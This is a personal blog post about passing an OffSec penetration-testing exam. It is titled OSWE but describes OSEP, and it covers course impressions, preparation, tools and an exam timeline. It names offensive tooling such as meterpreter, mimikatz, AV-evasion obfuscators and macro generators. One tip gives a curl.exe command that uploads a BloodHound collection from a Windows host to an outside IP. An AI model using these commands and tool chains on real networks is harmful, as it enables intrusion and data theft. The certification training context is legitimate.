---
layout: post
slug: passing-oswe
title: My Experience Passing the OSWE Cert
tags: [cert, oswe, pentesting]
---

I recently passed the OSEP exam on the first attempt achiving both independent requirements to pass: >=100 points and the `secret.txt` flag. I wanted to strengthen my internal pentesting skillz, since I'm more confortable with web hacking in general. So it was a nice opportunity to learn and test myself.



### os-what?


### the course

Things I liked:
- network section was accurate and I've seen that in real scenarios.
- the demonstration of why and how the default obfuscantion meterpreter gets flagged is quite good.
- challenges attack paths review the course material naturally. You touch everything quite decent.

Things I didn't love:
- some bypasses too crazy. i.e. disable Defender once admin. I've heard in CRTO you cannot do that.
- few OPSEC refs/considerations.
- some bypasses are too naive: these process hollowing is blocked by Crowdstrike or any other competent EDR. Although evasion is a very exigent field and you need to update constantly. This course provides a decent baseline.
- Some labs were a bit buggy.
https://kentosec.com/2024/05/14/osep-review-in-2024/

### reqs

IMHO, the following skills matter:
- ad structure.
- programming background: nothing crazy, but being confortable with c# and powershell is a must.
- ctfs.


### prep
I preped for 1.2 months, and this was my strategy:
- watched all videos at 2x speed.
- read the book not passively: highlighted important stuff.
- Reviewed TCM AD section of the PEH course as a refresher. I did already purchased it when doing the PNPT.
- Watched ippsec OSEP list.
- did first 5 challenges. thoroughly: investingating all possible attack paths: hta dropper and hta loader.
- documented everything and categorized.
- Re-reviewed my challenge solutions and I force myself to understand all concepts behind the commands: if you run into a rabbit hole and you treat everything as a blackbox, thats the recipe for disaster.


### r4nd0m tips
- Don't use SMB to connect to your Windows machine (slow AF), use updog (has upload functionality).
- You can compile with msc to avoid Visual Studio. I basically manage to compile everything with mono and didn't touch Windows machine. 
- change the name of the artifacts because they don't necessarily overwrite! Wasted hours because of this, kek.
- updog is god. curl.exe http://192.168.45.195/upload -F "file=@C:\Windows\tasks\20260415044446_BloodHound.zip" -F "path=./"º
- migrate your shells for stability.
- get confortable with pivoting. 
- be friend with you C2 of choice. Reviewed metasploit unleashed guide: https://www.offsec.com/metasploit-unleashed/

### resources

https://www.emmanuelsolis.com/osep.html
https://github.com/OoStellarnightoO/OSEP_Notes


### my gig
- virtualization: [kali on qemu on debian](/kali-on-qemu-on-debian).
- recon: autorecon.
- C2: keep calm and use meterpreter with custom C# loaders aligned with book's content.
- CLM: [bypassCLM]().
- Obfuscate C#: InvisibilityCloak.
- VBA: BadAssMacros
- file sharing: updog. it has file upload functionality too!
- ad enum: powerview and [adpeas](https://github.com/61106960/adPEAS).
- HTA: Dotnet2JScript loading js as external file
- privesc: linpeas.sh and winpeas.bat and powerup. But honestly I did everything manual.
- cred dump: mimikatz and secretdump. 
- reporting: [sysreptor](https://docs.sysreptor.com/offsec-reporting-with-sysreptor/).
- note taking: obsidian.
- revshell: [penelope](https://github.com/brightio/penelope)
- terminal: terminator
- rdp client: remmina.
- extension: Bye Bye, Google AI: Turn off Google AI Overviews, Discussions and Ads: https://chromewebstore.google.com/detail/bye-bye-google-ai-turn-of/imllolhfajlbkpheaapjocclpppchggc?pli=1

### exam

I grabbed a monster and started the exam at 01:00 AM, since my kids are asleep.
I promised myself to NOT going to sleep until I get confortable with the progress.

After 6 hours I had 40 points. I was feeling confident so I went for a quick nap.

I woke up at 10:00 AM. Then I did a lot of progress. It's not everything linear and the effort don't always translate to flags. People always stress that if you are blocked, don't force it and take a walk. But I thing the opposite is also true: if you are on a roll, don't stop digging.

Then I hit a wall after flag 6. So I took a walk to lower my cortisol levels. My strategy was to try until day two, and if not, move to the second path and get more flags. It was quite frustrating since I had clear what I wanted to do, but somehow didn't work. Finally I catched it: I missed a little syntax detail.

So after 23h I went to sleep with 9 flags in my pocket: I just needed one more. I woke up at 09:00 AM. Then I pulled secret.txt at 10:35 AM. That allowed me I met both independent criteria to pass: >=100 points and the secret.txt.

### grand finale

Two days after the exam I received the beloved email. I passed!

![alt text](image.png)


